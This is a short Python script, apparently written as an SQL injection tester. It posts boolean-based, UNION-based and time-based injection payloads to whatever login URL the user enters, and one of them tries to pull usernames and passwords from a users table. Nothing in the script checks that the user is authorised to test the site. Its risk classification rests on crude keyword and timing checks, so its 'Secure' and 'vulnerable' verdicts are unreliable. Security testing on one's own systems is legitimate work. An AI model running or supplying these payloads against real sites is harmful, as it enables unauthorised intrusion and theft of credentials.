import requests
import time

# Ask user to enter a target website URL
url = input("🔗 Enter website URL to test (e.g., http://example.com/login): ")


# Function to check responses and assign risk level
def classify_risk(response_text, response_time, test_type):
    if test_type == "Boolean-Based":
        if "Welcome" in response_text or "Dashboard" in response_text:
            return "🟠 Medium Risk: Website is vulnerable to Boolean-Based SQL Injection!"

    elif test_type == "UNION-Based":
        if "username" in response_text and "password" in response_text:
            return "🔴 High Risk: Website is leaking sensitive data via UNION-Based SQL Injection!"

    elif test_type == "Time-Based":
        if response_time > 4:  # Delay detected
            return "🔴 High Risk: Website is vulnerable to Time-Based Blind SQL Injection!"

    return "✅ Secure: No SQL injection vulnerability detected for this test."


# 1️⃣ Boolean-Based SQL Injection Test
print("\n🔍 Testing Boolean-Based SQL Injection...")
payloads = ["' OR 1=1 --", "' OR 1=2 --"]

for payload in payloads:
    response = requests.post(url, data={"username": payload, "password": "password"})
    result = classify_risk(response.text, 0, "Boolean-Based")
    print(f"Test on {url} with payload '{payload}' → {result}")

# 2️⃣ UNION-Based SQL Injection Test
print("\n🔍 Testing UNION-Based SQL Injection...")
union_payload = "' UNION SELECT null, username, password FROM users --"
response = requests.post(url, data={"search": union_payload})
result = classify_risk(response.text, 0, "UNION-Based")
print(f"Test on {url} with payload '{union_payload}' → {result}")

# 3️⃣ Time-Based Blind SQL Injection Test
print("\n🔍 Testing Time-Based Blind SQL Injection...")
time_payload = "' OR IF(1=1, SLEEP(5), 0) --"

start_time = time.time()
response = requests.post(url, data={"username": time_payload, "password": "password"})
end_time = time.time()

result = classify_risk(response.text, end_time - start_time, "Time-Based")
print(f"Test on {url} with payload '{time_payload}' → {result}")
